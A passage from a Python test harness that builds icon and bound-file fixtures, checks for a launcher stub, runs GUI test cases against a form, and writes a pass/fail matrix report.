            ["git", "-C", str(REPO), "rev-parse", "--short", "HEAD"],
            capture_output=True, text=True, check=False,
        ).stdout.strip()
    except OSError:
        return "?"


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--only", default=None, help="run cases whose name contains this")
    parser.add_argument("--gate", action="store_true", help="validation cases only")
    args = parser.parse_args()

    OUT.mkdir(parents=True, exist_ok=True)
    fixtures = OUT / "_fixtures"
    fixtures.mkdir(parents=True, exist_ok=True)
    icon = fixtures / "northline.ico"
    images = make_icon(icon)
    fuse = fixtures / "bound.com"
    make_bound_file(fuse)
    made = {"icon": icon, "images": images, "fuse": fuse}

    if not STUB.is_file():
        print(f"missing launcher: {STUB}")
        return 1

    app, window = begin()
    controls = inventory(window)
    form = Form(window)
    print(f"controls: {len(controls)}   cases: {len(cases(args.only, args.gate))}")

    results: list[Case] = []
    for name in cases(args.only, args.gate):
        try:
            case = run_case(name, form, made)
        except Exception as exc:
            case = Case(name=name, purpose="crashed")
            case.failure = f"{type(exc).__name__}: {exc}\n{traceback.format_exc(limit=3)}"
        results.append(case)
        mark = "ok  " if case.passed else "FAIL"
        detail = ""
        if not case.passed:
            detail = "  " + (case.failure or "; ".join(case.failed_rows[:2]))
        print(f"{mark} {name:<22} {case.size:>10,} B {case.seconds:>6.2f} s{detail}")

    write_report(results, controls, OUT / "matrix.json")
    print(f"\nreport: {OUT / 'matrix.md'}")
    return 0 if all(case.passed for case in results) else 2


if __name__ == "__main__":
    raise SystemExit(main())
